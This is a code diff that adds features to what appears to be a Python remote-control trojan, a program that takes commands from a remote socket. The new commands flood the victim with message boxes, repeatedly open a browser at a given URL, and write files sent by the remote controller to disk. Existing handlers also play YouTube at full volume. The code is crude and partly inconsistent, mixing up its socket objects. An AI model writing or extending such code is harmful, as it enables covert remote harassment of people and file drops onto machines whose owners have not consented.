@@ -9,6 +9,7 @@ import cython
 if os.name == "nt":
     import ctypes
     BitBlt = ctypes.windll.gdi32.BitBlt
+    MessageBox = ctypes.windll.user32.MessageBoxW
 
 
 
@@ -103,15 +104,43 @@ while 1:
         print("thats nothing")
     elif data[0] == "keepalive":
         s.send("still alive".encode())
+    elif data[0] == "spammessage":
+        a = (int(data[3]) / 100)
+        a2 = 0
+        while a2 < a:
+            time.sleep(0.01)
+            MessageBox(None, data[1], data[2], 0)
+            a2 = a2 + 0.01
+    elif data[0] == "spamwebsite":
+        a = (int(data[2]) / 100)
+        a2 = 0
+        while a2 < a:
+            time.sleep(0.01)
+            os.system("start iexplore " + data[1])
+            a2 = a2 + 0.01
+    elif data[0] == "upload":
+        if len(data) > 1:
+            if len(data) == 2:
+                f = open(data[1], "wb")
+            elif len(data) == 3:
+                f = open(data[2], "wb")
+            l = s.recv(1024)
+            f.write(l)
+            conn.settimeout(3)
+            while (l):
+                print("receiving...")
+                try:
+                    l = conn.recv(1024)
+                    f.write(l)
+                except:
+                    print("Something went wrong during the download. Or the download successfuly finished!! fuuck you anyywwaaay")
+                    break
+            print("done")
     elif data[0] == "youtube":
         if len(data) == 2:
             os.system("start iexplore -k " + ytlink1 + data[1] + "&autoplay=1")
         elif len(data) > 3:
             if data[2] == "--earrape":
-                mmde = CoCreateInstance(CLSID_MMDeviceEnumerator, None, 
-                        CLSCTX_ALL, IID_IMMDeviceEnumerator)
-                
-                call(["amixer", "-D", "pulse", "set", "Master", "100%"])
                 os.system("start iexplore -k " + ytlink1 + data[1])
 
 
